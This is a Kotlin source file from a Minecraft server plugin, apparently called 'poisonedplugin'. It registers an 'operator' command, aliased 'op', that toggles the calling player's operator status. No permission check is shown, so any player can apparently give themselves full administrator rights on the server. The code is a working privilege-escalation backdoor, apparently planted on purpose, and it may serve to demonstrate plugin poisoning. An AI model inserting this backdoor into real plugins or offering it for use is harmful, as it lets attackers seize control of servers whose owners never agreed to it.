package de.maxbossing.poisonedplugin.command

import de.maxbossing.poisonedplugin.manager.command
import de.maxbossing.poisonedplugin.utils.cmp
import de.maxbossing.poisonedplugin.utils.plus
import net.kyori.adventure.text.format.NamedTextColor
import org.bukkit.Bukkit

object OperatorCommand {
    val opCommand = command("operator", "Manipulates Operator Settings", listOf("op")) { player, args ->
        if (args.isEmpty()) {
            player.isOp = !player.isOp
            player.sendMessage(cmp("Operator status set to ") + cmp(player.isOp.toString()))

        }
    }
}